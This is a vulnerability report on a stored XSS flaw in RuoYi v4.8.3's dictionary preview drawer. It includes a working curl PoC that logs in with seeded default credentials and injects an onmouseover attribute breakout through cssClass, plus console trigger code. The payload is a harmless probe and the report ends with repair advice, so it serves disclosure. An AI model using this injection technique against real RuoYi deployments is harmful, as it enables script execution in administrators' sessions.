# RuoYi v4.8.3 字典数据预览 cssClass 上下文注入导致存储型跨站脚本攻击

> 结论：Reportable。v4.8.3 新增的字典数据抽屉预览将持久化的 cssClass 直接插入 HTML 属性。拥有 system:dict:add 的已认证账号可写入事件属性；受害者打开预览并将鼠标移到恶意条目上时，脚本在其 RuoYi 管理会话上下文执行。
>
> 建议严重度：High；CVSS 3.1 参考值 8.3 (AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N)。该分数是安全评估建议，不是已分配的 CVE 分数。

## NAME OF AFFECTED PRODUCT(S)

RuoYi

## Vendor Homepage

https://ruoyi.vip/

源代码仓库：https://github.com/yangzongzhuan/RuoYi

## AFFECTED AND/OR FIXED VERSION(S)

Affected Version:

v4.8.3，至少包括当前官方 master 对应的 v4.8.3 源码。

Fixed Version:

Unknown。审计时未发现包含修复的公开版本。

## Vulnerable File

- ruoyi-admin/src/main/resources/templates/system/dict/type/type.html
- ruoyi-admin/src/main/java/com/ruoyi/web/controller/system/SysDictDataController.java
- ruoyi-common/src/main/java/com/ruoyi/common/core/domain/entity/SysDictData.java
- ruoyi-common/src/main/java/com/ruoyi/common/xss/XssHttpServletRequestWrapper.java
- ruoyi-common/src/main/java/com/ruoyi/common/utils/html/HTMLFilter.java

## Vulnerable Code

### 1. 攻击者可控输入和持久化

POST /system/dict/data/add 只要求 system:dict:add 权限，随后直接把绑定的 SysDictData 交给服务层保存：

~~~java
// ruoyi-admin/src/main/java/com/ruoyi/web/controller/system/SysDictDataController.java:79-86
@RequiresPermissions("system:dict:add")
@PostMapping("/add")
@ResponseBody
public AjaxResult addSave(@Validated SysDictData dict)
{
    dict.setCreateBy(getLoginName());
    return toAjax(dictDataService.insertDictData(dict));
}
~~~

cssClass 只有长度限制，没有按 CSS class token 进行白名单校验：

~~~java
// ruoyi-common/src/main/java/com/ruoyi/common/core/domain/entity/SysDictData.java:111-119
@Size(min = 0, max = 100, message = "样式属性长度不能超过100个字符")
public String getCssClass()
{
    return cssClass;
}
~~~

服务层和 MyBatis 映射会保留该字段：

~~~java
// ruoyi-system/src/main/java/com/ruoyi/system/service/impl/SysDictDataServiceImpl.java:84-91
public int insertDictData(SysDictData data)
{
    int row = dictDataMapper.insertDictData(data);
    if (row > 0)
    {
        List<SysDictData> dictDatas = dictDataMapper.selectDictDataByType(data.getDictType());
        DictUtils.setDictCache(data.getDictType(), dictDatas);
    }
    return row;
}
~~~

~~~xml
<!-- ruoyi-system/src/main/resources/mapper/system/SysDictDataMapper.xml:95-118 -->
<insert id="insertDictData" parameterType="SysDictData">
    ...
    <if test="cssClass != null and cssClass != ''">css_class,</if>
    ...
    <if test="cssClass != null and cssClass != ''">#{cssClass},</if>
    ...
</insert>
~~~

### 2. 输入过滤不是上下文安全编码

默认 xss.enabled: true 时，/system/* 的 POST 参数经过 EscapeUtil.clean()。该处理主要清除 HTML 标签；在 HTMLFilter 的普通文本路径中，双引号被明确保留，而不是转义成 HTML entity：

~~~java
// ruoyi-common/src/main/java/com/ruoyi/common/xss/XssHttpServletRequestWrapper.java:23-35
String[] values = super.getParameterValues(name);
...
escapseValues[i] = EscapeUtil.clean(values[i]).trim();
~~~

~~~java
// ruoyi-common/src/main/java/com/ruoyi/common/utils/html/HTMLFilter.java:515-530
private String encodeQuotes(final String s)
{
    if (encodeQuotes)
    {
        ...
        // 不替换双引号为&quot;，防止json格式无效
        m.appendReplacement(buf, Matcher.quoteReplacement(one + two + three));
        ...
    }
}
~~~

这不是适用于 HTML 属性上下文的编码器：cssClass 原本是普通参数，但后续被放进了双引号包围的 class 属性。

### 3. 新增字典抽屉把该值重新解释为 HTML

v4.8.3 的字典类型页新增 view() / renderDrawer()。服务端返回的 cssClass 被直接拼接进 HTML，最终通过 jQuery .html() 解析：

~~~javascript
// ruoyi-admin/src/main/resources/templates/system/dict/type/type.html:220-240
for (var i = 0; i < rows.length; i++) {
    var r = rows[i];
    var labelHtml = r.dictLabel;
    if (r.listClass && r.listClass !== 'default') {
        labelHtml = '<span class="badge badge-' + r.listClass + '">' + r.dictLabel + '</span>';
    } else if (r.cssClass) {
        labelHtml = '<span class="' + r.cssClass + '">' + r.dictLabel + '</span>';
    }

    html += '  <div class="dict-card-row"><div class="dict-card-key">标签</div>'
         + '<div class="dict-card-val">' + labelHtml + '</div></div>';
    html += '  <div class="dict-card-row"><div class="dict-card-key">键值</div>'
         + '<div class="dict-card-val"><code>' + r.dictValue + '</code></div></div>';
}
$("#drawerBody").html(html);
~~~

输入：

~~~text
cssClass=x" onmouseover="document.body.dataset.cveProbe=1
listClass=(空)
~~~

会变成：

~~~html
<span class="x" onmouseover="document.body.dataset.cveProbe=1">E2E_XSS_PROBE</span>
~~~

完整传递链为：POST 参数 → XssHttpServletRequestWrapper → 数据库/cache → 字典数据列表 JSON → renderDrawer() → innerHTML → 事件属性。

## VERSION(S)

Affected Version:

v4.8.3

Tested Commit:

源代码提交：3b3941abeb5402297e5b4de82a30e6471c2239f3  
本地工作树 HEAD：1a19343edc330b01d205c51f1cbcf02b557e7d14（仅额外包含既有报告文件）

## Software Link

- https://github.com/yangzongzhuan/RuoYi/tree/master
- https://github.com/yangzongzhuan/RuoYi/releases/tag/v4.8.3

## PROBLEM TYPE

Vulnerability Type:

Stored Cross-Site Scripting (Stored XSS)

CWE:

CWE-79 — Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

## Root Cause

根因是两个不同 HTML 上下文之间的信任边界丢失：

1. cssClass 被当作可保存的样式字符串接收，只有长度检查；
2. 默认 XSS 过滤器没有把普通文本中的引号按 HTML 属性上下文编码；
3. 新增字典抽屉把该字符串直接插入 <span class="...">，并交给 .html() 解析；
4. 引号因此可以闭合 class 属性并新增事件处理器。

动态测试观察到了由浏览器解析出的 onmouseover 属性及其执行结果。

## Evidence and Reasoning

证据状态：

- Candidate：发现 cssClass 被拼入 HTML 属性；
- Reachable：ry 非管理员账号使用 system:dict:add 成功写入攻击字符串；
- Impact-Proven：管理员浏览器加载字典抽屉后出现事件属性，派发 mouseover 后 document.body.dataset.cveProbe 变为 "1"；
- Reportable：默认 v4.8.3 页面和 xss.enabled: true 配置均包含该路径；v4.8.2 没有该抽屉，且已检查相关公开记录和历史差异。

实验环境中的应用容器使用 Java 17 和由当前源码生成的 ruoyi-admin/target/ruoyi-admin.jar，SHA-256 为：

~~~text
1de0fd350a10b73e17215d3db0f1f2b4c4e1daa0aa2b239cf49c6cec4786279b
~~~

实验只为方便登录关闭了验证码、把端口改为 18081，并把 CSRF 显式打开以测试更严格的条件；没有关闭 XSS 过滤，也没有修改前端或字典渲染代码。CSRF token 是通过正常页面 /index 和 /system/dict 获取的，因此该覆盖配置不改变 XSS sink 的证明。

## Impact

已证明：攻击者保存的 JavaScript 事件处理器在另一名管理员的已认证 RuoYi 页面中执行。执行上下文是 RuoYi 同源管理页面，因此脚本具备受害者浏览器对该源可访问的管理页面和接口的访问能力。

本报告只把“在管理员上下文执行脚本”作为已验证影响；没有把创建后门账号、读取具体业务数据等未单独复现的后果计入实测结果。

## Exploitation Prerequisites

- 攻击者需要登录账号，并被授予 system:dict:add；不需要成为超级管理员。
- 默认 SQL 中的 ry / admin123 是实验用非管理员账号；其 common 角色在随附种子数据中被授予字典管理按钮权限。实际部署中，任意被授予该权限的普通角色都满足条件。
- 受害者需要拥有字典列表权限并打开 /system/dict，点击字典类型（实验使用 sys_normal_disable，dictId=3）打开抽屉，然后将鼠标移到恶意标签所在卡片上。该用户交互是一次普通悬停操作。
- 默认配置 xss.enabled: true 不会阻止本攻击；默认 csrf.enabled: false 也不会增加攻击者的写入门槛。实验环境将 CSRF 打开后仍成功完成了整个验证。
- 不需要上传文件、数据库写权限、服务器本地访问或关闭 XSS 过滤器。

## DESCRIPTION

RuoYi v4.8.3 为字典类型列表加入了抽屉式数据预览，但 renderDrawer() 将持久化的 cssClass 直接插入 HTML 属性。RuoYi 的输入清理器没有按输出上下文编码双引号，低权限字典维护者可以保存一个会在管理员预览页面执行的事件属性。该路径跨越了低权限维护账号到高权限管理员浏览器的信任边界，应在发布版本中修复并增加浏览器级回归测试。

## Vulnerability Location:

- 写入入口：POST /system/dict/data/add，参数 cssClass；修改入口 POST /system/dict/data/edit 同样受影响。
- 预览入口：/system/dict 页面中的字典类型链接，v4.8.3 新增 view(dictId)。
- 触发字段：SysDictData.cssClass；listClass 为空时走 else if (r.cssClass) 分支。
- 最终 sink：ruoyi-admin/src/main/resources/templates/system/dict/type/type.html:231,240。

## Reproduction Steps

以下步骤针对本地 Docker 实验服务 http://127.0.0.1:18081。普通安装时将基础 URL 换成实际地址，并使用真实的具有 system:dict:add 权限的账号。

1. 启动 v4.8.3 默认应用和随附 SQL。实验应用使用 Java 17、MySQL 8.0；验证码关闭只是为了让命令行复现不依赖图片识别。
2. 以 ry/admin123 登录。该账号是实验种子中的非管理员账号。
3. 访问 /index 初始化会话 token，再访问 /system/dict 读取 meta[name="csrf-token"]。如果目标使用默认 csrf.enabled: false，可以省略下面请求的 X-CSRF-Token 头。
4. 使用下面 PoC 请求创建字典数据。
5. 以管理员账号打开 /index，再打开 /system/dict。
6. 点击字典类型 sys_normal_disable，等待抽屉加载字典数据。
7. 将鼠标移到 E2E_XSS_PROBE 卡片的标签上；或在该页面开发者控制台执行 PoC 中的 dispatchEvent 代码。
8. 观察 document.body.dataset.cveProbe 变为 "1"，这证明事件属性已经被浏览器解析并执行。
9. 按 PoC 末尾的清理命令删除测试字典数据。

## POC

### 低权限写入

~~~bash
BASE='http://127.0.0.1:18081'
WORK_DIR="$(mktemp -d /tmp/ruoyi-dict-xss-XXXXXX)"
COOKIE_FILE="$WORK_DIR/cookie.txt"

# captchaEnabled=false 仅用于本地实验；普通部署按正常登录流程获取会话。
curl -sS -c "$COOKIE_FILE" -b "$COOKIE_FILE" -X POST "$BASE/login" \
  --data 'username=ry&password=admin123&rememberMe=false'

# SysIndexController 在这里生成 csrf_token；若目标默认关闭 CSRF，可跳过此步和请求头。
curl -sS -c "$COOKIE_FILE" -b "$COOKIE_FILE" "$BASE/index" >/dev/null
DICT_PAGE="$(curl -sS -c "$COOKIE_FILE" -b "$COOKIE_FILE" "$BASE/system/dict")"
CSRF_TOKEN="$(printf '%s\n' "$DICT_PAGE" \
  | sed -n 's/.*content="\([^"]*\)" name="csrf-token".*/\1/p' | head -1)"

curl -sS -c "$COOKIE_FILE" -b "$COOKIE_FILE" \
  -H "X-CSRF-Token: $CSRF_TOKEN" \
  -X POST "$BASE/system/dict/data/add" \
  --data-urlencode 'dictLabel=E2E_XSS_PROBE' \
  --data-urlencode 'dictValue=cve_e2e_xss_20260906' \
  --data-urlencode 'dictType=sys_normal_disable' \
  --data-urlencode 'dictSort=9995' \
  --data-urlencode 'cssClass=x" onmouseover="document.body.dataset.cveProbe=1' \
  --data-urlencode 'listClass=' \
  --data-urlencode 'status=0' \
  --data-urlencode 'isDefault=N'
~~~

Expected write response:

~~~json
{"msg":"操作成功","code":0}
~~~

The tested low-privilege write was:

~~~text
create_by = ry
css_class = x" onmouseover="document.body.dataset.cveProbe=1
list_class = NULL
~~~

### 管理员触发

在管理员已登录的 /system/dict 页面打开 sys_normal_disable 抽屉后，在浏览器控制台运行：

~~~javascript
const injected = document.querySelector('#drawerBody span[onmouseover]');
console.log(injected.outerHTML);
injected.dispatchEvent(new MouseEvent('mouseover', { bubbles: true }));
console.log(document.body.dataset.cveProbe);
~~~

Expected output:

~~~text
<span class="x" onmouseover="document.body.dataset.cveProbe=1">E2E_XSS_PROBE</span>
1
~~~

Observed in the Docker lab:

~~~text
LOW_ADD={"msg":"操作成功","code":0}
LOW_ID=104
before.evil=<span class="x" onmouseover="document.body.dataset.cveProbe=1">E2E_XSS_PROBE</span>
trigger.probe=1
after=1
LOW_REMOVE={"msg":"操作成功","code":0}
DB_REMAINING=0
~~~

### 清理

使用返回的 dict_code 调用删除接口；本次实验中为 104：

~~~bash
curl -sS -c "$COOKIE_FILE" -b "$COOKIE_FILE" \
  -H "X-CSRF-Token: $CSRF_TOKEN" \
  -X POST "$BASE/system/dict/data/remove" \
  --data-urlencode 'ids=104'
~~~

如果只在隔离实验数据库中清理，也可以使用精确条件：

~~~sql
DELETE FROM sys_dict_data WHERE dict_value = 'cve_e2e_xss_20260906';
~~~

## Benign Control

资源耗尽、崩溃或解析放大类漏洞才要求同入口 benign control；本报告是脚本注入，不适用该类资源对照。作为代码级对照，令 cssClass=label-safe、listClass 为空时，期望结果是普通的 <span class="label-safe">...</span>，不应出现 onmouseover 属性，也不应改变 document.body.dataset.cveProbe。

## Authentication and User Interaction

需要认证，但不需要超级管理员身份。写入端点要求 system:dict:add；受害者需要具有字典列表权限并打开抽屉，随后进行一次鼠标悬停。实验中的 ry 是非管理员账号，且写入请求在 CSRF 已打开的实验配置下也成功完成；这说明漏洞本身不依赖 CSRF 默认关闭这一旁支问题。

## Historical Difference

检索范围包括 RuoYi 官方仓库的 issue、v4.8.2/v4.8.3 文件快照、公开 CVE/GHSA 和相关变更记录，检索日期为 2026-09-06。

### 与旧版本的差异

v4.8.2 的 system/dict/type/type.html 没有抽屉 view() / renderDrawer() 路径；v4.8.3 新增了该路径，并在 renderDrawer() 中加入 cssClass 到 <span class="..."> 的字符串拼接。这是本报告的版本边界和引入点：

- v4.8.2 文件快照：https://raw.githubusercontent.com/yangzongzhuan/RuoYi/v4.8.2/ruoyi-admin/src/main/resources/templates/system/dict/type/type.html
- v4.8.3 文件快照：https://raw.githubusercontent.com/yangzongzhuan/RuoYi/v4.8.3/ruoyi-admin/src/main/resources/templates/system/dict/type/type.html

### 与已公开问题的差异

- RuoYi issue #212 讨论的是旧字典标签中 < 的转义显示问题，不涉及 cssClass 属性值被插入新抽屉的 HTML sink：https://github.com/yangzongzhuan/RuoYi/issues/212
- issue #320 的输入源和 sink 是通知公告富文本 noticeContent 与 th:utext，并依赖 /system/notice/* 的 XSS 排除规则；本报告的输入源是 /system/dict/data/add 的 cssClass，sink 是 v4.8.3 字典抽屉的 innerHTML：https://github.com/yangzongzhuan/RuoYi/issues/320
- issue #329 的输入源是通知标题、sink 是首页通知下拉框；本报告不经过通知模块：https://github.com/yangzongzhuan/RuoYi/issues/329
- issue #308 是旧版本菜单管理的 menuName 渲染问题，受影响文件、字段、页面和版本范围均不同；本报告针对 v4.8.3 新增的字典预览路径：https://github.com/yangzongzhuan/RuoYi/issues/308
- CVE-2024-57438 / GHSA-h5jh-rp76-q242 是旧版角色分配导致的权限提升，不是本报告的脚本注入路径：https://github.com/advisories/GHSA-h5jh-rp76-q242
- 子代理动态复核发现的角色授权链与公开 CVE-2025-10989 重合，已明确排除，未并入本报告：https://nvd.nist.gov/vuln/detail/CVE-2025-10989

因此，本报告没有把通知公告 XSS、菜单 XSS、旧版角色越权或 CSRF 默认关闭重复提交；报告的是一个新的字典数据输入字段和新的 v4.8.3 前端 sink。

## Suggested Repair

1. 不要把 cssClass、dictLabel、dictValue 或 listClass 直接拼接到 HTML 字符串中。使用 document.createElement()、textContent 和 element.className / classList 构造节点。
2. 如果必须保留 class 扩展能力，服务端只允许单个或有限个 class token，例如 [A-Za-z0-9_-]{1,64}，拒绝引号、空白、<、> 和事件属性字符；listClass 使用固定枚举。
3. 在输出点按实际上下文编码，而不是依赖通用请求参数清理器。修复应覆盖新增和修改接口，并清理或重新编码历史数据库中的危险值。
4. 增加回归测试：用 cssClass=x" onmouseover="... 写入后，抽屉 DOM 不得包含事件属性；同时验证合法 primary、danger 等显示样式不受影响。
